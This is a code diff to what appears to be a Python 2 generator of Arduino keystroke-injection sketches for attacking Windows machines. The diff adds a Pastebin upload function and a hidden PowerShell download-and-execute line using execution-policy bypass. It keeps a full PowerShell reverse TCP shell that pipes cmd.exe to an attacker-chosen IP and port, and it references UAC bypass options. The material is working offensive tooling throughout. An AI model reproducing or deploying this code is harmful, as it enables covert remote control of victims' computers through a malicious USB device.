@@ -7,6 +7,7 @@ import os
 import subprocess
 import coreUtils
 import nfoCore
+import requests
 
 def WinBanner():
 
@@ -91,7 +92,7 @@ def notificationBubble():
         print "Current notification bubble message is: " + message
         
         print "\n"
-        customize = raw_input("Do you want to change the notification bubble text? (Y/n):")
+        customize = raw_input("Do you want to change the notification bubble text? (Y/n): ")
         
         if customize in ('Y','y','yes','Yes','YES',''):
           print "\n"
@@ -312,10 +313,18 @@ def WinWriteFile(fileName,payloadFunc,bypassUAC,payload, bubble):
   print "\n\noutput written to " + fileName
   raw_input("\nPress Enter to continue and return to Main Menu...")
   coreUtils.clearScreen()
-  
-  
+
+
+def uploadToPastebin(key,code):
+    # default expire to 1month
+    params = {'api_dev_key':key, 'api_paste_private':'1','api_option':'paste', 'api_paste_expire_date':'1M','api_paste_code':code}
+    req = requests.post("https://pastebin.com/api/api_post.php", data=params)
+
+    pastebinUrl = req.text.replace('pastebin.com/','pastebin.com/raw/')
+    return pastebinUrl\
+
 def WinOption1():
- 
+
   done = False
   looper = False
   URL=""
@@ -1219,7 +1228,7 @@ def WinOption9():
     if selection =='1': 
       remoteIP = raw_input("Please enter the IP address of the remote server to connect to: ")
     elif selection == '2':
-      remotePort = raw_input("Please enter the listening port on the remote server:")	
+      remotePort = raw_input("Please enter the listening port on the remote server: ")	
     elif selection == '3': 
       bypassUACoption,bypassUAC = checkUACBypass()
     elif selection == '4':
@@ -1285,6 +1294,7 @@ def WinOption10():
 
   done = False
   looper = False
+  pastebinKey = False
   remoteIP= ""
   remotePort= ""
   fileName=""
@@ -1295,13 +1305,13 @@ def WinOption10():
   while looper != True:
 
     coreUtils.clearScreen()
-    print "********************************************************************************************"
-    print "*                                                                                          *"
-    print "*                         windows/meterpreter/reverse_https                                *"
-    print "*            This payload will create a Reverse HTTPS meterpreter session                  *"
-    print "*          Options are: 1. IP Address 2. Listening Port 3. The output File name            *"
-    print "*                                                                                          *"
-    print "********************************************************************************************"
+    print "******************************************************************************************************"
+    print "*                                                                                                    *"
+    print "*                         windows/meterpreter/reverse_https                                          *"
+    print "*            This payload will create a Reverse HTTPS meterpreter session                            *"
+    print "*   Options are: 1. IP Address 2. Listening Port 3. The output File name 4. direct or via pastebin   *"
+    print "*                                                                                                    *"
+    print "******************************************************************************************************"
     print "\n"
   
     menu = {}
@@ -1312,7 +1322,8 @@ def WinOption10():
     menu['4'] = "Set bypassUAC mode"
     menu['5'] = "Set Arduino sketch filename"
     menu['6'] = "Set notification bubble option"
-    menu['7'] = "Write Arduino sketch"
+    menu['7'] = "Put payload to pastebin"
+    menu['8'] = "Write Arduino sketch"
     menu['42']= "Return to previous menu"
     menu['99']= "Exit"
 
@@ -1334,13 +1345,15 @@ def WinOption10():
       print "Notification bubble set to -> " + bubbleSetting
     if fileName != "":
       print "Arduino filename set to ->  " + fileName
-    
+    if pastebinKey:
+        print "Upload payload to pastebin -> Enabled (key: %s)" % pastebinKey
+
     selection=raw_input("\nPlease Select: ") 
 
     if selection =='1': 
       remoteIP = raw_input("Please enter the IP address of the remote server to connect to: ")
     elif selection == '2':
-      remotePort = raw_input("Please enter the listening port on the remote server:")	
+      remotePort = raw_input("Please enter the listening port on the remote server: ")	
     elif selection == '3':
       RCfile = coreUtils.getRCFileName('revMetPSH.rc')
     elif selection == '4': 
@@ -1350,6 +1363,11 @@ def WinOption10():
     elif selection == '6':
       bubble, bubbleSetting = notificationBubble()
     elif selection == '7':
+      if not pastebinKey:
+        pastebinKey = raw_input("Please enter your pastebin API key: ")
+      else:
+        pastebinKey = False
+    elif selection == '8':
       if done == False:
         print "\nYou have not set all the options"
         raw_input("Press Enter to return to the menu and set all the options")
@@ -1371,15 +1389,27 @@ def WinOption10():
   if done == True and looper == True:  
 
     payload = "void reversePSH(){\n"
-    payload += "  Keyboard.println(\"powershell -w hidden -nop -c function RSC{if ($c.Connected -eq $true) {$c.Close()};"
-    payload += "if ($p.ExitCode -ne $null) {$p.Close()};exit;};$a='"+remoteIP+"';$p='"+remotePort+"';$c=New-Object system.net.sockets.tcpclient;"
-    payload += "$c.connect($a,$p);$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize;$p=New-Object System.Diagnostics.Process;"
-    payload += "$p.StartInfo.FileName='cmd.exe';$p.StartInfo.RedirectStandardInput=1;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.UseShellExecute=0;"
-    payload += "$p.Start();$is=$p.StandardInput;$os=$p.StandardOutput;Start-Sleep 1;$e=new-object System.Text.AsciiEncoding;while($os.Peek() -ne -1){$o += $e.GetString($os.Read())};"
-    payload += "$s.Write($e.GetBytes($o),0,$o.Length);$o=$null;$d=$false;$t=0;while (-not $d) {if ($c.Connected -ne $true) {RSC};$pos=0;$i=1; "
-    payload += "while (($i -gt 0) -and ($pos -lt $nb.Length)) {$r=$s.Read($nb,$pos,$nb.Length - $pos);$pos+=$r;if (-not $pos -or $pos -eq 0) {RSC};if ($nb[0..$($pos-1)] -contains 10) {break}};"
-    payload += "if ($pos -gt 0){$str=$e.GetString($nb,0,$pos);$is.write($str);start-sleep 1;if ($p.ExitCode -ne $null){RSC}else{$o=$e.GetString($os.Read());"
-    payload += "while($os.Peek() -ne -1){$o += $e.GetString($os.Read());if ($o -eq $str) {$o=''}};$s.Write($e.GetBytes($o),0,$o.length);$o=$null;$str=$null}}else{RSC}};\");\n"
+    payload += "  Keyboard.println(\""
+
+    if pastebinKey:
+        rpayload = '''
+        put here your ps1 dropper
+        '''
+        pastebinUrl = uploadToPastebin(pastebinKey,rpayload)
+        payload +=  "powershell -ep bypass -noni -nop -w hidden -c \\\"IEX (New-Object Net.WebClient).DownloadString('"+pastebinUrl+"')\\\""
+    else:
+        payload += "powershell -w hidden -nop -c function RSC{if ($c.Connected -eq $true) {$c.Close()};"
+        payload += "if ($p.ExitCode -ne $null) {$p.Close()};exit;};$a='"+remoteIP+"';$p='"+remotePort+"';$c=New-Object system.net.sockets.tcpclient;"
+        payload += "$c.connect($a,$p);$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize;$p=New-Object System.Diagnostics.Process;"
+        payload += "$p.StartInfo.FileName='cmd.exe';$p.StartInfo.RedirectStandardInput=1;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.UseShellExecute=0;"
+        payload += "$p.Start();$is=$p.StandardInput;$os=$p.StandardOutput;Start-Sleep 1;$e=new-object System.Text.AsciiEncoding;while($os.Peek() -ne -1){$o += $e.GetString($os.Read())};"
+        payload += "$s.Write($e.GetBytes($o),0,$o.Length);$o=$null;$d=$false;$t=0;while (-not $d) {if ($c.Connected -ne $true) {RSC};$pos=0;$i=1; "
+        payload += "while (($i -gt 0) -and ($pos -lt $nb.Length)) {$r=$s.Read($nb,$pos,$nb.Length - $pos);$pos+=$r;if (-not $pos -or $pos -eq 0) {RSC};if ($nb[0..$($pos-1)] -contains 10) {break}};"
+        payload += "if ($pos -gt 0){$str=$e.GetString($nb,0,$pos);$is.write($str);start-sleep 1;if ($p.ExitCode -ne $null){RSC}else{$o=$e.GetString($os.Read());"
+        payload += "while($os.Peek() -ne -1){$o += $e.GetString($os.Read());if ($o -eq $str) {$o=''}};$s.Write($e.GetBytes($o),0,$o.length);$o=$null;$str=$null}}else{RSC}};"
+
+
+    payload += "\");\n"
     payload += "  pressEnter();\n"
     if bypassUACoption == "run As (visible popup)":
       payload += "  Keyboard.println(\"exit\");\n"
